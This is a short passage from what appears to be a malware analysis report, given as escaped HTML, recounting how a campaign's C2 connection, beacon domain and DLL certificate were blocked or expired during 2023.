frozen; only the configuration blob changed.\u003c/p\u003e\u003cp\u003eBy April 2023, the C2 connection was blocked. By May, the beacon domain expired. By June, the DLL's C2 certificate expired. The infrastructure was never renewed.\u003c/p\u003e\u003ctable
